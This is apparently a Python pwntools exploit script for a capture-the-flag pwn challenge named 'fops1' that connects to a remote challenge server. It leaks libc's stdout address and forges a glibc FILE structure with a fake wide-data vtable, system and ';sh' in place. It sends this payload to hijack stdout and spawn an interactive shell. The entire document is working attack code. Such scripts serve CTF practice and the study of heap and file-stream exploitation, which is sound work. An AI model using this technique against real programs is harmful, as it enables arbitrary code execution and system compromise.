#!/usr/bin/env python3
from pwn import *
import warnings
import sys

context(arch='amd64', os='linux')
warnings.filterwarnings('ignore')

#io = process("./fops1_patched")
io = remote("0.cloud.chals.io", 27987)

elf = ELF("./fops1_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

io.recvuntil(b'instruction ')

stdout = int(io.recvline().strip(), 16)

libc.address = stdout - libc.sym["_IO_2_1_stdout_"]

info(f"stdout: {hex(libc.sym._IO_2_1_stdout_)}")

def FSOP_struct(
    flags=0,
    _IO_read_ptr=0,
    _IO_read_end=0,
    _IO_read_base=0,
    _IO_write_base=0,
    _IO_write_ptr=0,
    _IO_write_end=0,
    _IO_buf_base=0,
    _IO_buf_end=0,
    _IO_save_base=0,
    _IO_backup_base=0,
    _IO_save_end=0,
    _markers=0,
    _chain=0,
    _fileno=0,
    _flags2=0,
    _old_offset=0,
    _cur_column=0,
    _vtable_offset=0,
    _shortbuf=0,
    lock=0,
    _offset=0,
    _codecvt=0,
    _wide_data=0,
    _freeres_list=0,
    _freeres_buf=0,
    __pad5=0,
    _mode=0,
    _unused2=b"",
    vtable=0,
    more_append=b""
):
    FSOP = p64(flags)
    FSOP += p64(_IO_read_ptr)
    FSOP += p64(_IO_read_end)
    FSOP += p64(_IO_read_base)
    FSOP += p64(_IO_write_base)
    FSOP += p64(_IO_write_ptr)
    FSOP += p64(_IO_write_end)
    FSOP += p64(_IO_buf_base)
    FSOP += p64(_IO_buf_end)
    FSOP += p64(_IO_save_base)
    FSOP += p64(_IO_backup_base)
    FSOP += p64(_IO_save_end)
    FSOP += p64(_markers)
    FSOP += p64(_chain)
    FSOP += p32(_fileno)
    FSOP += p32(_flags2)
    FSOP += p64(_old_offset)
    FSOP += p16(_cur_column)
    FSOP += p8(_vtable_offset)
    FSOP += p8(_shortbuf)
    FSOP += p32(0)
    FSOP += p64(lock)
    FSOP += p64(_offset)
    FSOP += p64(_codecvt)
    FSOP += p64(_wide_data)
    FSOP += p64(_freeres_list)
    FSOP += p64(_freeres_buf)
    FSOP += p64(__pad5)
    FSOP += p32(_mode)

    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

stdout_lock = libc.sym.__nptl_last_event - 0x48

FSOP = FSOP_struct(
    flags = u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _unused2=b"\x00"*12 + p64(libc.sym._IO_2_1_stdout_ - 8), #libc.sym._IO_2_1_stdout_ - 8),
    _markers=libc.sym.system,
    _wide_data=libc.sym._IO_2_1_stdout_ - 0x10,
    vtable=libc.sym._IO_wfile_jumps - 0x20,
    #_mode=0xFFFFFFFF
)

#FSOP = b"\x01"*8
#FSOP += cyclic(0xf0)[8:136] + p64(stdout_lock) + cyclic(0xf0)[142:0xf0]

info(f"FSOP payload len: {len(FSOP)}")

input("PAUSE")
io.sendline(FSOP)
#io.sendline(cyclic(0xf0))
io.interactive()

